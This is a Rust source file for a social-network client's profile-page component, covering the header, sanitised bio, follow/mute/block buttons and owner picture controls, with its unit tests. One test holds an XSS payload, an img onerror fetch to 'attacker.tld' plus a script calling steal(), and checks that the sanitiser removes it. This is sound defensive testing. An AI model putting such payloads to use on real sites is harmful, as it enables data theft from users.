//! A profile: who the account is, what can be done about it, and what they posted.
//!
//! The two paints disagreed about this screen in three ways, and this component settles each
//! one: the header's fields (the server said `followers · following`, the client
//! `following · followers`), the bio (the server drew sanitised HTML, the client the text of
//! it), and the verbs (the server drew none). The first two are one tree now; the third is a
//! callback that is absent on the server, so the button keeps its box and loses only its
//! press.
//!
//! What stays with the screen is what this crate may not know: the tab strip, the cards
//! (a client card has verbs, a media viewer and a clock), the pagination control, and the
//! transport behind each verb. They arrive as slots, and the page owns their order — header,
//! tabs, the status list, then whatever the screen adds under it.

use crate::pages::settings::form::{ProfileField, ProfileImage, is_link};
use leptos::prelude::*;
use nodus_client_core::model::{Account, Relationship, Status};
use nodus_ui::session_style::{BannerRegionKind, PublishedStyle};

use crate::components::CardRenderer;
use crate::display_name;
use crate::status_card::StatusCard;

/// What the reader can change about their own profile, and nothing else.
///
/// The profile picture and the account header are two different pictures on the account
/// document. The side banners are the reader's session artwork, painted outside the
/// profile card by the shell. One struct carries all four so the page can show them as one
/// group of owner-only controls, while the client keeps the two transports apart: account
/// pictures travel through the media endpoint, side banners through the style editor.
#[derive(Clone, Copy, Debug)]
pub struct ProfileEditor {
    /// Asks the browser for a picture. The answer is handed back through the callback.
    pub pick_picture: Callback<(ProfileImage, Callback<Account>)>,
    /// Opens the style editor at one side banner.
    pub edit_banner: Callback<BannerRegionKind>,
    /// The account picture already being uploaded, if any.
    pub busy: Signal<Option<ProfileImage>>,
    /// The last save's sentence: `Ok` when it landed, `Err` when the instance refused it.
    pub message: Signal<Option<Result<String, String>>>,
    /// Whether the left side banner already holds a picture.
    pub left_banner: Signal<bool>,
    /// Whether the right side banner already holds a picture.
    pub right_banner: Signal<bool>,
    /// Hands the account the instance answered with back to the screen that paints it.
    pub on_saved: Callback<Account>,
}

/// How a profile reads the banners an account published for other readers.
///
/// A callback rather than a value because only the browser has a transport: this crate owns
/// the gate and the page's lifecycle, the client owns the request. Absent on the server,
/// which has nothing to ask with and therefore draws no banners.
#[derive(Clone, Copy, Debug)]
pub struct ProfileBanners {
    /// Asks for one account's published style and hands back `None` when it has none.
    pub load: Callback<(String, Callback<Option<PublishedStyle>>)>,
}

/// A profile header with Follow, Mute and Block, then the account's posts.
///
/// `show_statuses` hides the list without forgetting that it is empty: an account with no
/// posts and a screen showing another tab are different states, and only the screen knows
/// which one it is in.
#[component]
#[expect(
    clippy::needless_pass_by_value,
    reason = "a Leptos component receives its props by value"
)]
pub fn ProfilePage(
    /// The account this page is about.
    account: Account,
    /// How the reader stands with the account, or `None` while nobody has answered: a verb
    /// without an answer would have to guess "follow" or "unfollow".
    relationship: Option<Relationship>,
    /// The posts, as a signal so the client can append a page without rebuilding the header.
    statuses: Signal<Vec<Status>>,
    /// Whether the status list is the tab on show.
    show_statuses: bool,
    /// The screen's own tab strip, drawn between the header and the list.
    #[prop(optional)]
    tabs: Option<ChildrenFn>,
    /// The screen's own foot: the next page, another tab's list, a transport error.
    #[prop(optional)]
    after: Option<ChildrenFn>,
    /// Paints one status. Absent (the server) means the shared card without verbs.
    #[prop(optional)]
    card: Option<CardRenderer>,
    /// How old a status is, in words, from the caller's clock. Only the default card reads
    /// it; a caller that paints its own cards already owns a clock.
    #[prop(optional)]
    age_of: Option<Callback<String, String>>,
    /// Follows or unfollows; the flag says which. Absent on the server.
    #[prop(optional)]
    on_follow: Option<Callback<(String, bool)>>,
    /// Mutes or unmutes; the flag says which. Absent on the server.
    #[prop(optional)]
    on_mute: Option<Callback<(String, bool)>>,
    /// Blocks or unblocks; the flag says which. Absent on the server.
    #[prop(optional)]
    on_block: Option<Callback<(String, bool)>>,
    /// Opens the picture full size. Absent on the server, where the box is inert.
    #[prop(optional)]
    on_avatar: Option<Callback<String>>,
    /// Whether the reader can act on the relationship at all.
    #[prop(default = true)]
    show_verbs: bool,
    /// The metadata rows this account carries, or `None` when the caller has none to show.
    ///
    /// The rows the account's owner wrote, ticked where the instance verified the link.
    /// Passed only for the reader's own profile: rows belong to the signed-in account, and
    /// a visitor's page has no session to attribute them to.
    #[prop(optional)]
    fields: Option<Signal<Vec<ProfileField>>>,
    /// The owner's picture and banner controls, or `None` on anyone else's profile.
    editor: Option<ProfileEditor>,
    /// How this paint reads the banners the account published for readers. Absent on the
    /// server, which has no transport and draws no banners.
    banners: Option<ProfileBanners>,
) -> impl IntoView {
    let published = RwSignal::new(None::<PublishedStyle>);
    let capability = nodus_ui::capabilities::serves();
    if let Some(banners) = banners {
        let account_id = account.id.clone();
        // One read per account, even if the capability answer arrives in two steps: the
        // second run sees the id already asked for and leaves the answer alone.
        let requested = StoredValue::new(None::<String>);
        // Owned by the page, not by the effect run that starts the read. The capability
        // answer re-runs the effect, and a callback created inside it would be disposed
        // with that run before the read answers; `Callback::run` then panics and the
        // banners never reach `published`.
        let done = Callback::new(move |style: Option<PublishedStyle>| published.set(style));
        Effect::new(move |_| {
            let at = capability.map(|signal| signal.get());
            if !nodus_ui::capabilities::reads_public_banners(at.as_ref(), true) {
                requested.set_value(None);
                return;
            }
            if requested.get_value().as_deref() == Some(account_id.as_str()) {
                return;
            }
            requested.set_value(Some(account_id.clone()));
            // The previous account's banners must not stand in for this account's while
            // its own read is in flight.
            published.set(None);
            banners.load.run((account_id.clone(), done));
        });
    }
    let name = display_name(&account.display_name, &account.acct);
    let handle = format!("@{}", account.acct);
    let counts = format!(
        "{} posts · {} following · {} followers",
        account.statuses_count, account.following_count, account.followers_count,
    );
    // The bio is HTML from the instance, sanitised here before `inner_html`: drawing it as
    // text would show a reader the tags instead of the links, and `inner_html` is safe once
    // filtered through the shared allowlist. An empty note draws no paragraph rather than an
    // empty one.
    let bio = nodus_ui::html::body(&account.note);
    let has_bio = !bio.is_empty();
    let header = nodus_ui::picture::banner(&account.header);
    let header_still = nodus_ui::picture::banner_still(&account.header);
    let header_shape = nodus_ui::picture::banner_box(account.header_shape());
    // With a published shape the ratio owns the height; without one the layout keeps its
    // shallow strip, exactly as it painted before shapes were read.
    let header_class = if header_shape.is_some() {
        "w-full object-cover"
    } else {
        "h-32 w-full object-cover"
    };
    let has_header = !header.is_empty();
    let avatar = nodus_ui::picture::avatar(&account.avatar);
    let avatar_shape = nodus_ui::picture::avatar_box(account.avatar_shape());
    let has_avatar = !avatar.is_empty();
    let picture = StoredValue::new(avatar.clone());
    // The id is read by three handlers, so it lives in a stored value: a `String` captured
    // by value would make the first handler `FnOnce`, and a stored value is `Copy`.
    let target = StoredValue::new(account.id.clone());
    // An unanswered relationship promises no verb, so every label says nothing ("…") and
    // every button is disabled. A guessed "Follow" is a claim about state nobody has.
    let ready = relationship.is_some();
    let ((follow, follow_on), (mute, mute_on), (block, block_on)) = match relationship {
        Some(found) => (
            if found.following {
                ("Unfollow", false)
            } else {
                ("Follow", true)
            },
            if found.muting {
                ("Unmute", false)
            } else {
                ("Mute", true)
            },
            if found.blocking {
                ("Unblock", false)
            } else {
                ("Block", true)
            },
        ),
        None => (("…", false), ("…", false), ("…", false)),
    };
    // Stored for the same reason the card stores its slots: the children are taken out of
    // the page once, and a captured `ChildrenFn` would have to be cloned out of `Fn`.
    let tabs = StoredValue::new(tabs);
    let after = StoredValue::new(after);

    let rows = move || statuses.get();
    let custom = card;
    let render = move |status: Status| match custom.as_ref() {
        Some(card) => card(status),
        None => default_card(status, age_of),
    };
    let list = show_statuses.then(|| {
        view! {
            <ul class="flex flex-col gap-3">
                <For each=rows key=|status| status.id.clone() let:status>
                    {render(status)}
                </For>
            </ul>
        }
    });

    view! {
        <crate::Screen>
            <nodus_ui::PublishedBanners style=Signal::derive(move || published.get()) />
            <header class="card overflow-hidden border border-base-300 bg-base-100 shadow-sm">
                {has_header.then(|| view! {
                    // The banner fills the header's width. Its published shape supplies
                    // the height through `aspect-ratio`; an unpublished shape leaves the
                    // layout's fixed strip in place.
                    <nodus_ui::picture::Picture
                        src=header
                        still=header_still
                        shape=header_shape
                        class=header_class
                        priority=true
                    />
                })}
                <div class="card-body gap-3 p-4">
                    <div class="flex items-start gap-3">
                        {face(has_avatar, avatar, avatar_shape, picture, on_avatar, !has_header)}
                        <div class="min-w-0 flex-1">
                            <h1 class="truncate text-lg font-semibold">{name}</h1>
                            <p class="truncate text-sm opacity-60">{handle}</p>
                            <p class="mt-2 text-xs opacity-60">{counts}</p>
                        </div>
                    </div>
                    {editor.map(editor_controls)}
                    {has_bio
                        .then(|| {
                            view! {
                                <p
                                    class="whitespace-pre-line text-sm leading-relaxed"
                                    inner_html=bio
                                ></p>
                            }
                        })}
                    {fields.map(metadata)}
                    <Show when=move || show_verbs>
                        <div class="flex flex-wrap items-center gap-2">
                            {verb(follow, "btn btn-primary btn-sm", follow_on, target, on_follow, ready)}
                            {verb(mute, "btn btn-ghost btn-sm", mute_on, target, on_mute, ready)}
                            {verb(block, "btn btn-ghost btn-sm", block_on, target, on_block, ready)}
                        </div>
                    </Show>
                </div>
            </header>

            {tabs.with_value(|tabs| tabs.as_ref().map(|tabs| tabs()))}
            {list}
            {after.with_value(|after| after.as_ref().map(|after| after()))}
        </crate::Screen>
    }
}

/// The owner's four controls, under the name and counts.
///
/// Two account pictures and two session banners sit in one row because that is what the
/// reader is choosing between, but each button names its own target: a profile picture is not
/// a header image, and neither is a side banner. The row is absent on every profile but the
/// reader's own; the page receives no editor there.
fn editor_controls(editor: ProfileEditor) -> AnyView {
    let pick = editor.pick_picture;
    let saved = editor.on_saved;
    let busy = editor.busy;
    let message = editor.message;
    let edit_banner = editor.edit_banner;
    let left_banner = editor.left_banner;
    let right_banner = editor.right_banner;
    view! {
        <div class="flex flex-wrap items-center gap-2" aria-label="Profile pictures and banners">
            <button
                class="btn btn-outline btn-xs"
                type="button"
                aria-label="Change profile picture"
                disabled=move || busy.get().is_some()
                on:click=move |_| pick.run((ProfileImage::Avatar, saved))
            >
                "Change profile picture"
            </button>
            <button
                class="btn btn-outline btn-xs"
                type="button"
                aria-label="Change header image"
                disabled=move || busy.get().is_some()
                on:click=move |_| pick.run((ProfileImage::Header, saved))
            >
                "Change header image"
            </button>
            <button
                class="btn btn-ghost btn-xs"
                type="button"
                aria-label=move || banner_label("left", left_banner.get())
                on:click=move |_| edit_banner.run(BannerRegionKind::Left)
            >
                {move || banner_label("left", left_banner.get())}
            </button>
            <button
                class="btn btn-ghost btn-xs"
                type="button"
                aria-label=move || banner_label("right", right_banner.get())
                on:click=move |_| edit_banner.run(BannerRegionKind::Right)
            >
                {move || banner_label("right", right_banner.get())}
            </button>
        </div>
        {move || match message.get() {
            Some(Ok(sentence)) => {
                view! { <p class="text-xs text-success" role="status">{sentence}</p> }.into_any()
            }
            Some(Err(sentence)) => {
                view! { <p class="text-xs text-error" role="alert">{sentence}</p> }.into_any()
            }
            None => ().into_any(),
        }}
    }
    .into_any()
}

/// The sentence a side-banner button carries: add an empty one, edit one with a picture.
fn banner_label(side: &str, has_picture: bool) -> String {
    if has_picture {
        format!("Edit {side} side banner")
    } else {
        format!("Add a {side} side banner")
    }
}

/// The profile picture, in the rounded box the account row draws.
///
/// The box is drawn even with no picture, so the names beside it keep their place. Without
/// a callback the box is a `span` with the client's title and none of its affordance: the
/// server paints the same rectangle the client boots in, and a picture that is not there
/// would move the name by twelve units.
fn face(
    has_avatar: bool,
    avatar: String,
    shape: Option<nodus_ui::picture::PictureBox>,
    source: StoredValue<String>,
    on_avatar: Option<Callback<String>>,
    priority: bool,
) -> AnyView {
    let still = nodus_ui::picture::avatar_still(&avatar);
    let picture = has_avatar.then(|| {
        view! {
            <nodus_ui::picture::Picture
                src=avatar
                still=still
                width=64
                height=64
                shape=shape
                class="h-16 w-16 rounded-full object-cover"
                priority=priority
            />
        }
    });
    if let Some(on_avatar) = on_avatar {
        return view! {
            <button
                class="avatar cursor-zoom-in"
                type="button"
                title="Expand picture"
                on:click=move |_| on_avatar.run(source.get_value())
            >
                <div class="w-16 rounded-full bg-base-300">{picture}</div>
            </button>
        }
        .into_any();
    }
    view! {
        <span class="avatar cursor-default pointer-events-none" title="Expand picture">
            <div class="w-16 rounded-full bg-base-300">{picture}</div>
        </span>
    }
    .into_any()
}

/// The metadata rows, under the bio: a label and what it points at.
///
/// The block is absent when there are no rows, and each value is a `rel="me"` link only
/// when it is one: the mark says the instance verified a link, so a tick beside a sentence
/// would be a claim about something the instance never checked.
fn metadata(fields: Signal<Vec<ProfileField>>) -> AnyView {
    view! {
        <Show when=move || !fields.get().is_empty()>
            <dl class="mt-2 flex flex-col gap-1 text-sm">
                {move || fields.get().into_iter().map(metadata_row).collect_view()}
            </dl>
        </Show>
    }
    .into_any()
}

/// One metadata row: the label, then the value and the instance's verdict on it.
fn metadata_row(field: ProfileField) -> AnyView {
    let value = field.value.trim().to_owned();
    let linked = is_link(&value);
    let shown = if linked {
        view! { <a class="link" rel="me" href=value.clone()>{value.clone()}</a> }.into_any()
    } else {
        view! { <span>{value.clone()}</span> }.into_any()
    };
    let mark = field.verified_at.is_some().then(|| {
        view! {
            <span class="badge badge-success badge-xs ml-1" role="img" aria-label="Verified link">
                "✔"
            </span>
        }
    });
    view! {
        <div class="flex gap-2">
            <dt class="shrink-0 font-semibold">{field.name}</dt>
            <dd class="min-w-0 break-all">{shown}{mark}</dd>
        </div>
    }
    .into_any()
}

/// One relationship verb, in the client's box.
///
/// The button is disabled rather than absent where there is no callback or no relationship:
/// the server paints the whole row the client does, and a control that is missing is a row
/// whose width changes when the client boots.
fn verb(
    label: &'static str,
    class: &'static str,
    on: bool,
    target: StoredValue<String>,
    send: Option<Callback<(String, bool)>>,
    ready: bool,
) -> AnyView {
    let disabled = !ready || send.is_none();
    view! {
        <button
            class=class
            disabled=disabled
            on:click=move |_| {
                if let Some(send) = send {
                    send.run((target.get_value(), on));
                }
            }
        >
            {label}
        </button>
    }
    .into_any()
}

/// The card the server paints and the client's fallback: the shared card with no verbs.
///
/// A boost's age belongs to the boosted post, which is the line the card draws.
fn default_card(status: Status, age_of: Option<Callback<String, String>>) -> AnyView {
    let created_at = status
        .reblog
        .as_ref()
        .map_or(status.created_at.as_str(), |inner| {
            inner.created_at.as_str()
        })
        .to_owned();
    let age = age_of.map_or_else(String::new, |age_of| age_of.run(created_at));
    let inner = status.reblog.as_deref().unwrap_or(&status);
    let host = nodus_web::shared::handles::host_of_acct(&inner.account.acct).or_else(|| {
        inner
            .url
            .as_deref()
            .and_then(nodus_web::shared::handles::host_of_url)
    });
    let author_path = nodus_web::shared::handles::profile_path_for(&inner.account.acct, host);
    let thread_path = nodus_web::shared::handles::status_path(host, &inner.id);
    view! {
        <StatusCard
            status=status
            age=age
            author_path=author_path
            thread_path=thread_path
            interactive=false
        />
    }
    .into_any()
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use leptos::prelude::{Callback, Owner, RenderHtml as _, Signal};
    use nodus_client_core::model::Account;
    use nodus_ui::session_style::BannerRegionKind;

    use crate::pages::settings::form::ProfileImage;

    use super::{ProfileEditor, ProfilePage, ProfilePageProps};

    fn render_profile(account: Account) -> String {
        Owner::new().with(|| {
            let statuses = Signal::derive(Vec::new);
            ProfilePage(ProfilePageProps {
                account,
                relationship: None,
                statuses,
                show_statuses: true,
                tabs: None,
                after: None,
                card: None,
                age_of: None,
                on_follow: None,
                on_mute: None,
                on_block: None,
                on_avatar: None,
                show_verbs: false,
                fields: None,
                editor: None,
                banners: None,
            })
            .to_html()
        })
    }

    fn owner_editor(
        message: Option<Result<String, String>>,
        left_banner: bool,
        right_banner: bool,
        picks: Arc<AtomicUsize>,
    ) -> ProfileEditor {
        ProfileEditor {
            pick_picture: Callback::new(
                move |(_kind, _done): (ProfileImage, Callback<Account>)| {
                    picks.fetch_add(1, Ordering::Relaxed);
                },
            ),
            edit_banner: Callback::new(|_region: BannerRegionKind| {}),
            busy: Signal::derive(|| None),
            message: Signal::derive(move || message.clone()),
            left_banner: Signal::derive(move || left_banner),
            right_banner: Signal::derive(move || right_banner),
            on_saved: Callback::new(|_account: Account| {}),
        }
    }

    fn render_own_profile(
        message: Option<Result<String, String>>,
        left_banner: bool,
        right_banner: bool,
    ) -> String {
        let picks = Arc::new(AtomicUsize::new(0));
        let editor = owner_editor(message, left_banner, right_banner, picks.clone());
        let html = Owner::new().with(|| {
            let statuses = Signal::derive(Vec::new);
            ProfilePage(ProfilePageProps {
                account: account_with_picture(),
                relationship: None,
                statuses,
                show_statuses: false,
                tabs: None,
                after: None,
                card: None,
                age_of: None,
                on_follow: None,
                on_mute: None,
                on_block: None,
                on_avatar: None,
                show_verbs: false,
                fields: None,
                editor: Some(editor),
                banners: None,
            })
            .to_html()
        });
        assert_eq!(
            picks.load(Ordering::Relaxed),
            0,
            "painting the controls must not ask for a file"
        );
        html
    }

    fn account_with_picture() -> Account {
        Account {
            id: "1".to_owned(),
            acct: "alice@example.org".to_owned(),
            display_name: "Alice".to_owned(),
            note: String::new(),
            avatar: "https://social.test/media/1/avatar".to_owned(),
            avatar_meta: None,
            header: "https://social.test/media/2/header".to_owned(),
            header_meta: None,
            bot: false,
            locked: false,
            followers_count: 0,
            following_count: 0,
            statuses_count: 0,
            last_status_at: None,
            discoverable: None,
            indexable: None,
            noindex: None,
            fields: Vec::new(),
        }
    }

    fn render_profile_note(note: &str) -> String {
        let account = Account {
            id: "1".to_owned(),
            acct: "alice@example.org".to_owned(),
            display_name: "Alice".to_owned(),
            note: note.to_owned(),
            avatar: String::new(),
            avatar_meta: None,
            header: String::new(),
            header_meta: None,
            bot: false,
            locked: false,
            followers_count: 0,
            following_count: 0,
            statuses_count: 0,
            last_status_at: None,
            discoverable: None,
            indexable: None,
            noindex: None,
            fields: Vec::new(),
        };
        render_profile(account)
    }

    #[test]
    fn the_profile_pictures_let_the_document_choose_the_still() {
        let mut account = Account {
            id: "1".to_owned(),
            acct: "alice@example.org".to_owned(),
            display_name: "Alice".to_owned(),
            note: String::new(),
            avatar: "https://social.test/media/1/avatar".to_owned(),
            avatar_meta: None,
            header: "https://social.test/media/2/header".to_owned(),
            header_meta: None,
            bot: false,
            locked: false,
            followers_count: 0,
            following_count: 0,
            statuses_count: 0,
            last_status_at: None,
            discoverable: None,
            indexable: None,
            noindex: None,
            fields: Vec::new(),
        };
        let html = render_profile(account.clone());
        assert_eq!(html.matches("<picture>").count(), 2, "{html}");
        assert!(
            html.contains("srcset=\"https://social.test/media/2/header_static\""),
            "{html}"
        );
        assert!(
            html.contains("srcset=\"https://social.test/media/1/avatar_static\""),
            "{html}"
        );
        assert!(html.contains("width=\"64\""), "{html}");
        // The banner comes first in the document, so it is the one the browser loads eagerly.
        let banner = html.find("header_static").expect("no banner source");
        let avatar = html.find("avatar_static").expect("no avatar source");
        assert!(banner < avatar, "the banner must lead: {html}");
        account.header = String::new();
        let html = render_profile(account);
        assert!(html.contains("loading=\"eager\""), "{html}");
    }

    #[test]
    fn profile_page_sanitizes_account_note_xss() {
        let rendered = render_profile_note(
            "<p>bio</p><img src=x onerror=\"fetch('https://attacker.tld')\"><script>steal()</script>",
        );
        assert!(!rendered.contains("onerror"), "{rendered}");
        assert!(!rendered.contains("attacker.tld"), "{rendered}");
        assert!(!rendered.contains("<script"), "{rendered}");
        assert!(rendered.contains("<p>bio</p>"), "{rendered}");
    }

    #[test]
    fn own_profile_names_the_profile_picture_the_header_and_both_side_banners() {
        let html = render_own_profile(None, false, true);
        assert!(html.contains("Change profile picture"), "{html}");
        assert!(html.contains("Change header image"), "{html}");
        assert!(html.contains("Add a left side banner"), "{html}");
        assert!(html.contains("Edit right side banner"), "{html}");
        assert_eq!(
            html.matches("aria-label=\"Change profile picture\"")
                .count(),
            1,
            "{html}"
        );
    }

    #[test]
    fn a_profile_without_an_editor_paints_none_of_the_four_controls() {
        let html = render_profile(account_with_picture());
        for label in [
            "Change profile picture",
            "Change header image",
            "side banner",
        ] {
            assert!(
                !html.contains(label),
                "{label} on a stranger's profile: {html}"
            );
        }
    }

    #[test]
    fn a_refused_save_paints_its_message_in_place() {
        let html = render_own_profile(
            Some(Err("The instance refused that picture.".to_owned())),
            false,
            false,
        );
        assert!(
            html.contains("role=\"alert\"") && html.contains("The instance refused that picture."),
            "{html}"
        );
    }

    #[test]
    fn a_landed_save_paints_its_sentence_as_status() {
        let html = render_own_profile(
            Some(Ok("Profile picture updated.".to_owned())),
            false,
            false,
        );
        assert!(
            html.contains("role=\"status\"") && html.contains("Profile picture updated."),
            "{html}"
        );
    }
}
